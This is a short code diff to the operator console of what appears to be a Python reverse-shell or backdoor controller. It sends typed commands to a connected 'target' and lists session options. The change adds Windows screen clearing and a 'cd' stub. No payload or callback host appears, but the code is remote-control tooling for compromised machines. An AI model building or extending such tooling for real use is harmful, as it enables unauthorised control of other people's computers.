@@ -22,11 +22,17 @@ def reliable_send(data):
 def target_communication():
     while True:
         command = input('* Shell~%s: ' % str(ip))
+
         reliable_send(command)
         if command == 'quit':
             break
         elif command == 'clear':
-            os.system("clear")
+            if os.name == 'nt':
+                os.system("cls")
+            else:
+                os.system("clear")
+        elif command[:3] == 'cd ':
+            pass
         elif command == 'help':
             print(termcolor.colored('''\n
             quit                                --> Quit session with the target
